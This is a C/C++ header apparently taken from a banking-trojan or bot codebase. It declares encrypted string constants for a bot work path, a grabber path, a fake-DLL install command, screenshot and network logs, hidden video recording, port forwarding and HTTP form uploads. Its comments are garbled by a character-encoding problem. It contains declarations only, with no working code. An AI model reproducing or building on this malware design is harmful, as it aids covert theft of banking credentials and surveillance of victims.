
//---------------------------------------------------------------------------
//  ������ �������� ��������� �������� ����
//
//  �������������: ���� 2012
//---------------------------------------------------------------------------

#ifndef StrConstsH
#define StrConstsH
//---------------------------------------------------------------------------

#include "Strings.h"

//��� ���������� ������, ������������� � ���� ����
#ifdef _MSC_VER
#	define CSSTR __declspec(align(1)) char
#else
#	define CSSTR char
#endif

//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr);





//=====================================================
//  ��������� ���������� ��������� ������
//=====================================================
extern CSSTR StrBotWorkPath[];
extern CSSTR StrGrabberPath[];

extern CSSTR StrPrefixFileName[];



// �������� ������, ������� ����� �������� ���
extern CSSTR CommandInstallFakeDLL[];


// ����� ������, ��� ���������� � ���
extern CSSTR StrLogFileScreenShot[];
extern CSSTR StrLogFileInformation[];
extern CSSTR StrLogFileNetInfo[];



// ����� ������� ���������� �����������.
extern CSSTR VideRecFuncRecordProcess[];
extern CSSTR VideRecFuncRecordWnd[];
extern CSSTR VideRecFuncStop[];
extern CSSTR VideRecFuncResetTimer[];
extern CSSTR VideRecFuncSendData[];
extern CSSTR VideRecFuncRunPortForward[];


// ��������� ������ HTTP
extern CSSTR HTTPFormContentDisposition[];
extern CSSTR HTTPFormFieldName[]; // ������ ������������ ����� ����
extern CSSTR HTTPFormFileInfo[];  // ������ ������ ������������ ���������� � ����� ����� ��� �������� �����
extern CSSTR HTTPOctetStream[];


// ������ ������ AzConfig
extern CSSTR AzConfigParamUserName[];



//�� ����������� ������ � ������
extern CSSTR Slash[];
extern CSSTR SlashChar;

// ������ ������ BSS �������
extern CSSTR BSSLogTemplate[];


#endif
